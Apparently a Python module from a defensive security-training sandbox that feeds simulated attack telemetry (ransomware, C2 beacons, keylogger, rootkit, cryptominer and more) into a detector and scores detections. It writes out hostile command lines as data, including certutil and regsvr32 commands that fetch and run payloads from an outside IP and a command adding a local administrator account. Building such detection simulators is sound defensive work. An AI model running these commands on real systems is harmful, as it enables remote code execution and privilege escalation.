"""
Simulator engine — generates realistic malicious telemetry for each attack
module and feeds it directly into Mahoraga's on_telemetry() pipeline.
These are simulators; no real malicious code executes.
"""

import time
import random
import threading
from typing import Callable

from python.core.logger import get_logger
from python.core.ipc_server import emit
from python.sandbox.attack_modules import MODULES_BY_ID, AttackModule

logger = get_logger('sandbox.simulator')


class AttackSimulator:
    def __init__(self, on_telemetry: Callable):
        self.on_telemetry = on_telemetry
        self.running = False
        self.current_module: AttackModule = None
        self.session_stats = {'caught': 0, 'evaded': 0, 'points': 0, 'attacks_launched': 0}

    # ── Public API ────────────────────────────────────────────────────────────

    def launch(self, module_id: str, target_id: str):
        module = MODULES_BY_ID.get(module_id)
        if not module:
            emit('SANDBOX_ERROR', {'message': f'Unknown module: {module_id}'})
            return
        if self.running:
            emit('SANDBOX_ERROR', {'message': 'An attack is already running.'})
            return
        self.running = True
        self.current_module = module
        self.session_stats['attacks_launched'] += 1
        threading.Thread(target=self._run, args=(module, target_id), daemon=True).start()

    def on_detection(self, threat: dict):
        if not self.running or not self.current_module:
            return
        severity = threat.get('severity', 0)
        if severity >= 6:
            self.session_stats['caught'] += 1
            self.session_stats['points'] += self.current_module.points
            emit('SANDBOX_DETECTION', {
                'result':      'caught',
                'module_id':   self.current_module.id,
                'attack_type': threat.get('attack_type'),
                'severity':    severity,
                'points':      self.current_module.points,
                'stats':       self.session_stats,
            })
        else:
            self.session_stats['evaded'] += 1
            emit('SANDBOX_DETECTION', {
                'result':    'evaded',
                'module_id': self.current_module.id,
                'severity':  severity,
                'stats':     self.session_stats,
            })

    def reset_session(self):
        self.running = False
        self.current_module = None
        self.session_stats = {'caught': 0, 'evaded': 0, 'points': 0, 'attacks_launched': 0}
        emit('SANDBOX_SESSION_RESET', self.session_stats)

    # ── Internal runner ───────────────────────────────────────────────────────

    def _run(self, module: AttackModule, target_id: str):
        emit('SANDBOX_ATTACK_STARTED', {
            'module_id':    module.id,
            'module_name':  module.name,
            'target_id':    target_id,
            'mitre_id':     module.mitre_id,
            'technique':    module.technique,
            'duration_sec': module.duration_sec,
            'points':       module.points,
        })
        try:
            fn = getattr(self, f'_sim_{module.id}', self._sim_generic)
            fn(module, target_id)
        except Exception as e:
            logger.error(f'Simulation error in {module.id}: {e}')
        finally:
            self.running = False
            self.current_module = None
            emit('SANDBOX_ATTACK_COMPLETE', {
                'module_id': module.id,
                'target_id': target_id,
                'stats':     self.session_stats,
            })

    def _t(self, line: str):
        emit('SANDBOX_TERMINAL_LINE', {'line': line, 'ts': time.time()})

    # ── Simulators ────────────────────────────────────────────────────────────

    def _sim_ransomware_sim(self, m: AttackModule, target_id: str):
        pid = random.randint(4000, 9000)
        self.on_telemetry({
            'source': 'process', 'event': 'new_process',
            'pid': pid, 'name': 'svchost32.exe',
            'exe': 'C:\\Windows\\Temp\\svchost32.exe',
            'cmdline': ['svchost32.exe', '-k', 'encrypt'],
            'ppid': 4, 'cpu': 0.0, 'memory': 0.5, 'connections': 0,
        })
        self._t('> svchost32.exe spawned from Temp directory')
        time.sleep(2)
        self._t('> Enumerating user files...')
        time.sleep(2)
        self._t('> Beginning file encryption sequence...')
        exts = ['.docx', '.xlsx', '.pdf', '.jpg', '.psd', '.sql']
        for i in range(25):
            self.on_telemetry({
                'source': 'file', 'event': 'file_modified',
                'file_path': f'C:\\Users\\Admin\\Documents\\file_{i}{random.choice(exts)}',
                'is_sensitive': True, 'pid': pid,
            })
            if i == 5:
                self._t(f'> {i+1} files modified...')
            if i == 15:
                self._t(f'> {i+1} files modified...')
                self.on_telemetry({
                    'source': 'file', 'event': 'mass_file_modification',
                    'count': 16, 'severity_hint': 10, 'attack_hint': 'ransomware',
                })
            time.sleep(0.4)
        self._t('> Renaming encrypted files to .locked')
        self.on_telemetry({
            'source': 'file', 'event': 'file_moved',
            'src': 'C:\\Users\\Admin\\Documents\\report.docx',
            'dest': 'C:\\Users\\Admin\\Documents\\report.docx.locked',
        })
        time.sleep(max(0, m.duration_sec - 18))

    def _sim_c2_beacon_sim(self, m: AttackModule, target_id: str):
        pid = random.randint(3000, 8000)
        self._t('> Establishing C2 channel...')
        self.on_telemetry({
            'source': 'process', 'event': 'new_process',
            'pid': pid, 'name': 'update_helper.exe',
            'exe': 'C:\\ProgramData\\update_helper.exe',
            'cmdline': ['update_helper.exe'],
            'ppid': 2048, 'cpu': 1.2, 'memory': 0.8, 'connections': 1,
        })
        time.sleep(2)
        interval = max(4, m.duration_sec // 8)
        for i in range(8):
            ip = f'185.220.{random.randint(100,200)}.{random.randint(1,254)}'
            self._t(f'> Beacon #{i+1} → {ip}:4444')
            self.on_telemetry({
                'source': 'network', 'event': 'suspicious_connection',
                'pid': pid, 'dest_ip': ip, 'dest_port': 4444,
                'packet_size': random.randint(40, 120), 'frequency': 12, 'protocol': 'TCP',
            })
            time.sleep(interval)

    def _sim_keylogger_sim(self, m: AttackModule, target_id: str):
        pid = random.randint(2000, 5000)
        self._t('> Injecting into explorer.exe...')
        self.on_telemetry({
            'source': 'process', 'event': 'high_risk_process',
            'pid': pid, 'name': 'explorer.exe', 'cmdline': ['explorer.exe'],
            'connections': 8, 'memory': 45.2, 'cpu': 0.5,
        })
        time.sleep(3)
        self._t('> Hook installed on keyboard API')
        self.on_telemetry({
            'source': 'process', 'event': 'resource_spike',
            'pid': pid, 'name': 'explorer.exe', 'cpu': 12.4, 'memory': 67.8,
        })
        time.sleep(max(0, m.duration_sec - 5))

    def _sim_privesc_sim(self, m: AttackModule, target_id: str):
        pid = random.randint(5000, 9000)
        self._t('> Checking current privileges...')
        self.on_telemetry({
            'source': 'process', 'event': 'high_risk_process',
            'pid': pid, 'name': 'cmd.exe',
            'cmdline': ['cmd.exe', '/c', 'whoami', '/priv'],
            'ppid': 1024, 'cpu': 0.5, 'memory': 0.2, 'connections': 0,
        })
        time.sleep(3)
        self._t('> SeImpersonatePrivilege available — escalating...')
        self.on_telemetry({
            'source': 'process', 'event': 'high_risk_process',
            'pid': random.randint(5000, 9000), 'name': 'cmd.exe',
            'cmdline': ['cmd.exe', '/c', 'net', 'localgroup', 'administrators', 'hacker', '/add'],
            'ppid': 1024, 'cpu': 0.8, 'memory': 0.3, 'connections': 0,
        })
        time.sleep(max(0, m.duration_sec - 5))

    def _sim_data_exfil_sim(self, m: AttackModule, target_id: str):
        self._t('> Gathering sensitive files...')
        time.sleep(3)
        self._t('> Compressing target data...')
        self.on_telemetry({
            'source': 'file', 'event': 'file_created',
            'file_path': '/tmp/.hidden_archive.tar.gz', 'is_sensitive': False,
        })
        time.sleep(3)
        self._t('> Initiating exfiltration...')
        interval = max(3, m.duration_sec // 6)
        for i in range(5):
            mb = random.randint(40, 90)
            ip = f'91.108.{random.randint(50,100)}.{random.randint(1,254)}'
            self.on_telemetry({
                'source': 'network', 'event': 'large_transfer',
                'dest_ip': ip, 'dest_port': 443, 'protocol': 'HTTPS',
                'packet_size': random.randint(8000, 65000),
                'bytes_total': mb * 1_000_000,
            })
            self._t(f'> Chunk {i+1}/5 sent ({mb}MB) → {ip}')
            time.sleep(interval)

    def _sim_rootkit_sim(self, m: AttackModule, target_id: str):
        self._t('> Loading kernel module...')
        self.on_telemetry({
            'source': 'file', 'event': 'file_created',
            'file_path': '/lib/modules/5.15.0/kernel/drivers/.hidden.ko',
            'is_sensitive': True,
        })
        time.sleep(4)
        self._t('> Hiding processes from /proc...')
        pid = random.randint(100, 500)
        self.on_telemetry({
            'source': 'process', 'event': 'new_process',
            'pid': pid, 'name': 'kworker/u:3',
            'exe': '/lib/modules/.hidden.ko', 'cmdline': [],
            'cpu': 85.4, 'memory': 12.1, 'connections': 3,
        })
        time.sleep(4)
        self._t('> Writing /etc/ld.so.preload for persistence...')
        self.on_telemetry({
            'source': 'file', 'event': 'file_modified',
            'file_path': '/etc/ld.so.preload', 'is_sensitive': True,
        })
        time.sleep(max(0, m.duration_sec - 10))

    def _sim_lolbin_sim(self, m: AttackModule, target_id: str):
        self._t('> Abusing certutil for file download...')
        self.on_telemetry({
            'source': 'process', 'event': 'high_risk_process',
            'pid': random.randint(5000, 9000), 'name': 'certutil.exe',
            'cmdline': ['certutil.exe', '-urlcache', '-split', '-f',
                        'http://185.220.101.45/payload.exe', 'C:\\Temp\\update.exe'],
            'ppid': 1024, 'cpu': 2.1, 'memory': 0.5, 'connections': 1,
        })
        time.sleep(5)
        self._t('> Executing payload via regsvr32...')
        self.on_telemetry({
            'source': 'process', 'event': 'high_risk_process',
            'pid': random.randint(5000, 9000), 'name': 'regsvr32.exe',
            'cmdline': ['regsvr32.exe', '/s', '/n', '/u',
                        '/i:http://185.220.101.45/script.sct', 'scrobj.dll'],
            'ppid': 1024, 'cpu': 1.8, 'memory': 1.2, 'connections': 1,
        })
        time.sleep(max(0, m.duration_sec - 7))

    def _sim_cryptominer_sim(self, m: AttackModule, target_id: str):
        pid = random.randint(3000, 8000)
        self._t('> Deploying miner process...')
        self.on_telemetry({
            'source': 'process', 'event': 'new_process',
            'pid': pid, 'name': 'system_update',
            'exe': '/tmp/.system_update',
            'cmdline': ['.system_update', '--pool', 'xmr.pool.minergate.com:45700'],
            'ppid': 1, 'cpu': 94.5, 'memory': 8.2, 'connections': 1,
        })
        self._t('> Connected to pool — hash rate: 1.2 MH/s')
        interval = max(3, m.duration_sec // 5)
        for i in range(5):
            time.sleep(interval)
            self.on_telemetry({
                'source': 'process', 'event': 'resource_spike',
                'pid': pid, 'name': 'system_update',
                'cpu': random.uniform(88, 99), 'memory': random.uniform(7, 12),
            })
            self._t(f'> Mining... ({(i+1)*20}%)')

    def _sim_generic(self, m: AttackModule, target_id: str):
        self._t(f'> Launching {m.name}...')
        self.on_telemetry({
            'source': 'process', 'event': 'new_process',
            'pid': random.randint(2000, 9000), 'name': 'suspicious_process',
            'exe': '/tmp/suspicious', 'cmdline': ['suspicious', '--attack'],
            'cpu': 45.0, 'memory': 12.0, 'connections': 3,
        })
        time.sleep(m.duration_sec)
